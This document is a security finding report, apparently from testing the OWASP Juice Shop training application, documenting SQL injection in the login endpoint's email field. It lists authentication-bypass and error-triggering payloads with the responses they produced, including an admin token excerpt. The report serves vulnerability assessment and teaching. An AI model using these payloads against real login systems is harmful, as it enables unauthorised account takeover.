# SQL Injection in Login Email Field

## Vulnerability Class
SQL Injection (SQLi)

## Endpoint
`POST /rest/user/login`

## Vulnerable Parameter
`email`

## Detection Payloads
1. `' OR 1=1 -- ` — Returns 200 OK with valid JWT authentication token for admin@juice-sh.op
2. `' ` (bare single quote) — Returns 500 Internal Server Error with SQLite/Sequelize stack trace
3. `' UNION SELECT 1,2,3 -- ` — Returns 500 Internal Server Error with SQLite/Sequelize stack trace

## Evidence
- Payload `' OR 1=1 -- ` returned HTTP 200 with a valid JWT token:
  ```json
  {
    "authentication": {
      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
      "bid": 1,
      "umail": "admin@juice-sh.op"
    }
  }
  ```
- Payload `' ` returned HTTP 500 with stack trace showing SQLite/Sequelize error:
  ```
  at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
  ```

## Impact
An attacker can authenticate as any user (including admin) without knowing credentials by injecting SQL into the email parameter. This allows full account takeover.

## Risk
**Critical** — Direct authentication bypass with demonstrated successful login as admin.

## Notes
- The password field was tested with the same payloads and returned 401 responses, indicating it is not vulnerable to SQLi.
- All other API endpoints (`/api/user`, `/rest/user`, `/rest/user/register`, `/api/user/register`, `/api/v1/user/anonymous/`) returned "Unexpected path" errors and are not accessible.